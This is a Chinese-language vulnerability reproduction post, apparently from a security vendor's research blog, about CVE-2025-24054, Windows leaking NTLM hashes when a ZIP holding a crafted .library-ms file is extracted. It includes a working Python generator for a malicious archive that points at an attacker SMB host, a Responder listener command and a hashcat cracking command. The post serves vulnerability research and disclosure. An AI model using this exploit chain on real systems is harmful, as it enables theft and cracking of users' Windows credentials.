#  Windows RAR/ZIP解压缩泄露NTLM哈希漏洞复现   
原创 mag1c7  山石网科安全技术研究院   2025-06-05 03:35  
  
![图片](https://mmbiz.qpic.cn/sz_mmbiz_gif/NGIAw2Z6vnLzibrp7C4HmazCNIQXMJIRxvbibNMMmxDGrTN0Z9ibYzXnSNKobTzADCPgdo1b7ukKNARFEicHqQiajWw/640?wx_fmt=gif&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/NGIAw2Z6vnLSsTccx7j0fJVU0OOoqKA8Jb8ZACqDjPdMzgicp2SzdZ19mFnVcBO53s1uA2cSfarQkwibVUeCeH9w/640?wx_fmt=other&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
  
****  
****  
**揭秘Windows漏洞：如何通过一个简单的压缩文件泄露你的密码！**  
  
****  
****  
![图片](https://mmbiz.qpic.cn/mmbiz_jpg/NGIAw2Z6vnLKuKAwMiaYedpTAYugKibaTBsHzf5pDuztECgfIgOfpG5DRF31jzhosMEj23dlx186q0zgLaIZj9lA/640?wx_fmt=other&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
  
  
在数字时代，网络安全已成为我们不得不面对的严峻挑战。最近发现的CVE-2025-24054漏洞，就是一个典型的例子，即使是最日常的操作，如解压一个文件，也可能成为黑客攻击的途径。这个被称为  
“通过RAR/ZIP解压缩导致的NTLM哈希泄露”的漏洞  
，利用了Windows文件管理器的自动文件处理机制，使得用户的密码安全岌岌可危。在这篇文章中，我们将深入探讨这一漏洞的原理、影响以及如何防范，以保护您的数字资产不受侵害。  
  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/NGIAw2Z6vnLSsTccx7j0fJVU0OOoqKA8lvpAJHElQA6DiaJniaZb0daO3Kppz9ndV9Z2hHsjMuH61r2hu0jesGSg/640?wx_fmt=other&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
**一、漏洞描述**  
  
  
该漏洞被称为  
“通过RAR/ZIP解压缩导致的NTLM哈希泄露”，利用了Windows文件管理器的自动文件处理机制。当用户从压缩包中提取一个包含恶意SMB路径的.library-ms  
文件时，Windows文件管理器会自动解析其内容以生成预览和索引元数据。当windows解析到恶意.library-ms  
文件中的smb url时windows会向恶意主机发起NTLM认证，导致用户口令的NTLM哈希值泄露，攻击者利用爆破工具破解哈希值得到用户口令。  
  
  
.library-ms  
文件  
是Win  
dows操作系统中用于管理和组织文件库的文件。文件库是Windows7及  
更高  
版本引入的一项功能，它为用户提供了一种方便的方式来组织和访问分散在不同磁盘位置的文件，而无需用户手动在各个文件夹之间切换查找。例如，用户可以把D盘和E盘的图片文件夹都添加到  
“图片”文件库中。.library-ms  
文件会记录这些文件来源的路径信息，让用户在资源管理器中通过文件库就能快速访问这些分散的文件，而不用分别去不同的磁盘位置查找。  
  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/NGIAw2Z6vnLSsTccx7j0fJVU0OOoqKA8lvpAJHElQA6DiaJniaZb0daO3Kppz9ndV9Z2hHsjMuH61r2hu0jesGSg/640?wx_fmt=other&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
**二、PoC**  
  
****  
**（一）环境搭建**  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/NGIAw2Z6vnLSsTccx7j0fJVU0OOoqKA8WFHRW8Evk0zcqAPJSmSRktqm69UXCNGtz8L1sz1g1Wg3sEYViamG90Q/640?wx_fmt=other&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
- kali：192.168.23.78  
  
- windows 10：192.168.23.134  
  
**（二）测试**  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/NGIAw2Z6vnLSsTccx7j0fJVU0OOoqKA8WFHRW8Evk0zcqAPJSmSRktqm69UXCNGtz8L1sz1g1Wg3sEYViamG90Q/640?wx_fmt=other&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
- 在kali机运行以下命令  
  
```
 sudo responder -I eth0 -v
```  
  
  
- 运行poc.py生成恶意压缩包exploit.zip  
  
```
#poc.pyimport osimport zipfiledef main():      file_name = input("Enter your file name: ")      ip_address = input("Enter IP (EX: 192.168.1.162): ")      library_content = f"""<?xml version="1.0" encoding="UTF-8"?>  <libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">    <searchConnectorDescriptionList>      <searchConnectorDescription>        <simpleLocation>          <url>\\\\{ip_address}\\shared</url>        </simpleLocation>      </searchConnectorDescription>    </searchConnectorDescriptionList>  </libraryDescription>  """      library_file_name = f"{file_name}.library-ms"      with open(library_file_name, "w", encoding="utf-8") as f:          f.write(library_content)      with zipfile.ZipFile("exploit.zip", mode="w", compression=zipfile.ZIP_DEFLATED) as zipf:          zipf.write(library_file_name)      if os.path.exists(library_file_name):          os.remove(library_file_name)      print("completed")if __name__ == "__main__":      main()
```  
  
  
将压缩包迁移至win10虚拟机,右键点击解压：  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnRVicAfrnY8bbAb1ZApFesIzd75iaMD66fWNcr1XRwHNavz9ahZpAHxseMJwvbdWhmyBIHeUrM8rrRw/640?wx_fmt=png&from=appmsg "")  
  
  
解压后，windows系统会自动解析.library-ms  
中的<url>标签,从而使得windows访问指向kali的smb url，当Windows尝试访问SMB共享时，会自动发起NTLM认证。可以发现responder监听到smb通信流量，并提取其中的关键信息。  
  
  
- 破解hash获得口令  
  
进入/usr/share/responder/logs  
找到获取到的NTML hash  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnRVicAfrnY8bbAb1ZApFesIzvPMIOqHnPIEQTTG0FylbQFxDe1U6F4iclgiaziauI4A5ZoCzPlpSnV05Q/640?wx_fmt=png&from=appmsg "")  
  
  
在当前目录下使用hashcat破解hash值：  
  
```
hashcat -m 5600 SMB-NTLMv2-SSP-192.168.23.134.txt  /usr/share/wordlists/rockyou.txt --force
```  
  
  
破解得到8913  
：  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnRVicAfrnY8bbAb1ZApFesIzJlOwdO4IMyibLJpVKhstxGU4eRlNjPvicXaicap9qsJj6XhAno5uPSCkA/640?wx_fmt=png&from=appmsg "")  
  
  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/NGIAw2Z6vnLSsTccx7j0fJVU0OOoqKA8lvpAJHElQA6DiaJniaZb0daO3Kppz9ndV9Z2hHsjMuH61r2hu0jesGSg/640?wx_fmt=other&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
**三、相关链接**  
  
****  
[1]https://cti.monster/blog/2025/03/18/CVE-2025-24071.html  
  
[2]https://github.com/0x6rss/CVE-2025-24071_PoC?tab=readme-ov-file  
  
[3]https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-24054  
  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/NGIAw2Z6vnLSsTccx7j0fJVU0OOoqKA8KrXv9sZf93yt4huq2kARyZSgmdnic40GayohIYiaD2FAkkAqJehJSMtQ/640?wx_fmt=other&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
山石网科是中国网络安全行业的技术创新领导厂商，由一批知名网络安全技术骨干于2007年创立，并以首批网络安全企业的身份，于2019年9月登陆科创板（股票简称：山石网科，股票代码：688030）。  
  
  
现阶段，山石网科掌握30项自主研发核心技术，申请560多项国内外专利。山石网科于2019年起，积极布局信创领域，致力于推动国内信息技术创新，并于2021年正式启动安全芯片战略。2023年进行自研ASIC安全芯片的技术研发，旨在通过自主创新，为用户提供更高效、更安全的网络安全保障。目前，山石网科已形成了具备“全息、量化、智能、协同”四大技术特点的涉及基础设施安全、云安全、数据安全、应用安全、安全运营、工业互联网安全、信息技术应用创新、安全服务、安全教育等九大类产品服务，50余个行业和场景的完整解决方案。  
  
  
![图片](https://mmbiz.qpic.cn/sz_mmbiz_gif/NGIAw2Z6vnLzibrp7C4HmazCNIQXMJIRxPibycdiaNQCI4PNojUk3eYCQDZs6c5zNMUkq7yFNeYQIxicAV33eHNdFA/640?wx_fmt=gif&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
  
